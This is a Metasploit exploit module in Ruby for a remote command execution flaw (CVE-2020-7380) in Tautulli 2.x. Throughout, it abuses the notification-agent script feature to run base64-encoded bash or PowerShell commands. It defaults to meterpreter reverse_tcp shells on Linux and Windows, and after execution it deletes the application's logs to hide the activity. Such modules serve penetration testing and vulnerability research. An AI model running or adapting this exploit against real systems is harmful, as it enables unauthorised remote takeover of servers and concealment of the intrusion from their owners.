class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStager

    $nid = ""
    def initialize(info={})
      super(update_info(info,
          'Name'           => 'Tautulli Arbitrary Remote Command Execution',
          'Description'    => %q(
              This module exploits an RCE in Tautulli v2.0.0-beta through v2.5.3.
          ),
          'License'        => MSF_LICENSE,
          'Author'         => ['Phillip Castellanos <hackhappyorg[AT]gmail.com>'],
          'References'     =>
            [
              [ 'URL', 'https://www.hackhappy.org/2020/10/16/tautulli-remote-command-execution-vulnerability-cve-2020-7380'],
              [ 'CVE', '2020-7380']
            ],
          'Notes'           =>
          {
            'Reliability' => [ REPEATABLE_SESSION ],
            'Stability'   => [ CRASH_SAFE ]
          },
          'Targets'        =>
            [
              [
                'Linux',
                {
                  'Platform' => 'linux',
                  'Arch' => [ ARCH_X64, ARCH_X86 ],
                  'DefaultOptions' =>
                    {
                      'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
                    }
                }
              ],
              [
                'Windows',
                  {
                    'Platform' => 'win',
                    'Arch' => [ ARCH_X64, ARCH_X86 ],
                    'DefaultOptions' =>
                    {
                      'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                    }
                  }
              ]
            ],
          'DisclosureDate' => "Sep 1 2020",
          'DefaultTarget'  => 0
        )
      )
      register_options(
      [
        Opt::RPORT(8181),
        OptString.new('USERNAME', [ false, "Username to authenticate with", '']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ])
      deregister_options('SRVHOST', 'SRVPORT', 'URIPATH')
    end

    def check
      uri = target_uri.path
      res = send_request_cgi({
        'method'   => 'GET',
        'cookie'  => $cookie,
        'uri'      => normalize_uri(uri, 'home')
      })
      if datastore['TARGET'] == 0
          ver = res.to_s.match /js\?v\d\.\d+\.\d+/
          if ver && ver.length() > 0
              mjr = ver[0].match /\d/
              if mjr[0] == '2'
                  print_good("Found version " + (ver[0].match /\d\.\d+\.\d+/).to_s + " which appears vulnerable")
                  return Exploit::CheckCode::Appears
              end
          else
              print_error("Unable to determine if host is vulnerable.")
              return Exploit::CheckCode::Unknown
          end
      end
      if datastore['TARGET'] == 1
          ver = res.to_s.match /js\?1698622d63f406d50da4429e2b5d1b5d55893358/
          if ver && ver.length() > 0
              print_good("#{(datastore['RHOST'])} appears vulnerable!")
              return Exploit::CheckCode::Appears
          else
              print_error("Unable to determine if host is vulnerable.")
              return Exploit::CheckCode::Unknown
          end
      end
      rescue ::Rex::ConnectionError
          fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
    end

    def execute_command(cmd, opts = {})
      go = ''
      if datastore['TARGET'] == 0 #lin
          doit = "-c 'echo -n #{Rex::Text.encode_base64(cmd)} |base64 --decode|bash'"
          go = 'bash'
      elsif datastore['TARGET'] == 1 #win
          doit = "/c " + cmd_psh_payload(payload.encoded, payload_instance.arch.first)
          go = 'cmd'
      end

      uri = target_uri.path
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => normalize_uri(uri, 'send_notification'),
        'cookie' => $cookie,
        'vars_post' => {
          "notifier_id" => $nid,
          "script" => "#{(go)}",
          "script_args" => "#{(doit)}",
          "notify_action" => "test",
          "_" => "1595307220083"
        }
      })
      if res && res.code == 200
        print_status("Queued notification agent")
      elsif res.code == 303
        fail_with(Failure::NoAccess, "#{peer} - Failed to login to target!")
      end
      if datastore['TARGET'] == 0
          sleep 5
      elsif datastore['TARGET'] == 1
          sleep 20
      end
      res = send_request_cgi({
          'method'    => 'POST',
          'uri'      => normalize_uri(uri, 'delete_logs'),
          'cookie' => $cookie,
          'vars_post' => {
              "logfile" => "tautulli"
          }
      })
      rescue ::Rex::ConnectionError
        fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
    end

    def exploit
      uri = target_uri.path
      $cookie = ''
      if datastore['USERNAME'] != '' && datastore['PASSWORD'] != ''
        print_status("Logging in with #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
        res = send_request_cgi({
          'method'   => 'POST',
          'uri'      => normalize_uri(uri, 'auth', 'signin'),
          'vars_post' => {
            "username": datastore['USERNAME'],
            "password": datastore['PASSWORD']
          }
        })
        if res && res.code == 200
          print_good("Logged In!")
          $cookie = res.get_cookies
        elsif res && res.code == 401
          fail_with(Failure::NoAccess, "#{peer} - Failed to login to the target!")
        end
      else
          res = send_request_cgi({
              'method'   => 'POST',
              'uri'      => normalize_uri(uri, 'home')
          })
          if res && res.code == 200
              $cookie = res.get_cookies
          else
              fail_with(Failure::NoAccess, "#{peer} - Failed to login to the target!")
          end
      end
      check()
      res = send_request_cgi({
          'method'   => 'POST',
          'uri'      => normalize_uri(uri, 'add_notifier_config'),
          'cookie' => $cookie,
          'vars_post' => {
              'agent_id' => "15",
              '_' => "1595307220083"
          }
      })
      js = {}
      if res && res.code == 200
          js = res.get_json_document
          $nid = js['notifier_id'].to_s
          if js['result'] == 'success'
            print_status("Created new agent")
          else
            fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response!")
            return
          end
      else
          fail_with(Failure::NoAccess, "#{peer} - Failed to login to the target!")
          return
      end
      if datastore['TARGET'] == 0
          res = send_request_cgi({
              'method'   => 'POST',
              'uri'      => normalize_uri(uri, 'set_notifier_config'),
              'cookie' => $cookie,
              'vars_post' => {
                "notifier_id": $nid, "agent_id": "15", "scripts_script_folder": "/usr/bin/", "scripts_script": "", "scripts_timeout": "30", "friendly_name": '', "on_play": "0", "on_stop": "0", "on_pause": "0", "on_resume": "0", "on_change": "0", "on_watched": "0", "on_buffer": "0", "on_concurrent": "0", "on_newdevice": "0", "on_created": "0", "on_intdown": "0", "on_intup": "0", "on_extdown": "0", "on_extup": "0", "on_pmsupdate": "0", "on_plexpyupdate": "0", "on_plexpydbcorrupt": "0", "parameter": '', "custom_conditions": "[{\"parameter\":\"\",\"operator\":\"\",\"value\":\"\"}]", "custom_conditions_logic": '', "on_play_subject": '', "on_stop_subject": '', "on_pause_subject": '', "on_resume_subject": '', "on_change_subject": '', "on_watched_subject": '', "on_buffer_subject": '', "on_concurrent_subject": '', "on_newdevice_subject": '', "on_created_subject": '', "on_intdown_subject": '', "on_intup_subject": '', "on_extdown_subject": '', "on_extup_subject": '', "on_pmsupdate_subject": '', "on_plexpyupdate_subject": '', "on_plexpydbcorrupt_subject": '', "test_script": '', "test_script_args": ''
              }
          })
      elsif datastore['TARGET'] == 1
          res = send_request_cgi({
              'method'   => 'POST',
              'uri'      => normalize_uri(uri, 'set_notifier_config'),
              'cookie' => $cookie,
              'vars_post' => {
                "notifier_id": $nid, "agent_id": "15", "scripts_script_folder": "c:\\windows\\", "scripts_script": "", "scripts_timeout": "30", "friendly_name": '', "on_play": "0", "on_stop": "0", "on_pause": "0", "on_resume": "0", "on_change": "0", "on_watched": "0", "on_buffer": "0", "on_concurrent": "0", "on_newdevice": "0", "on_created": "0", "on_intdown": "0", "on_intup": "0", "on_extdown": "0", "on_extup": "0", "on_pmsupdate": "0", "on_plexpyupdate": "0", "on_plexpydbcorrupt": "0", "parameter": '', "custom_conditions": "[{\"parameter\":\"\",\"operator\":\"\",\"value\":\"\"}]", "custom_conditions_logic": '', "on_play_subject": '', "on_stop_subject": '', "on_pause_subject": '', "on_resume_subject": '', "on_change_subject": '', "on_watched_subject": '', "on_buffer_subject": '', "on_concurrent_subject": '', "on_newdevice_subject": '', "on_created_subject": '', "on_intdown_subject": '', "on_intup_subject": '', "on_extdown_subject": '', "on_extup_subject": '', "on_pmsupdate_subject": '', "on_plexpyupdate_subject": '', "on_plexpydbcorrupt_subject": '', "test_script": '', "test_script_args": ''
              }
          })
      end

      if res && res.code == 200
          print_status("Saved agent config")
      else
          fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response!1")
          return
      end
      if datastore['TARGET'] == 0
        execute_cmdstager(linemax: 20240, flavor: 'echo')
      elsif datastore['TARGET'] == 1
        execute_cmdstager(linemax: 20240)
      end
      rescue ::Rex::ConnectionError
          fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
    end
  end
